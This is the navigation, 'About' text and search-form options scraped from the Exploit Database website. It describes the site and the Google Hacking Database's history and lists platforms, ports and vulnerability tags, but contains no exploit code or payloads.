| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


